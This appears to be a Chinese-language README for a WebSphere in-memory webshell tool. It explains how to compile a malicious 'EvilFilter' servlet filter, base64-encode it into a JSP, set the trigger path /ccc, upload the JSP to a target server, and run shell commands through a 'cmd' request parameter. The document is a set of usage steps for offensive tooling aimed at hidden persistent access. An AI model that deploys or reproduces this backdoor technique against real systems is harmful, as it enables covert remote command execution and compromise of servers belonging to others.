# WebsphereMemoryWebshell

Websphere内存马

## 使用方式

1. 自行修改`src/EvilFilter.java`中webshell实现方式，然后编译EvilFilter.java

```bash
cd src;
javac -classpath javax.servlet-api-4.0.1.jar ./EvilFilter.java
```

2. 将生成的字节码转为base64格式

```bash
cat EvilFilter.class | base64 -w 0 > EvilFilter.class.base64
```

3. 将EvilFilter.class.base64复制到`jsp/webshell.jsp`的第40行

4. 此外还可以自行修改`jsp/webshell.jsp`的第25-27行

```jsp

private static String filterName = "EvilFilter";
private static String filterClassName = "EvilFilter";
private static String url = "/ccc";
```

5. 将jsp文件上传到目标服务器

6. 访问

```
GET /ccc?cmd=touch%20/tmp/success HTTP/1.1
Host: 192.168.76.130:9443
Connection: close

```
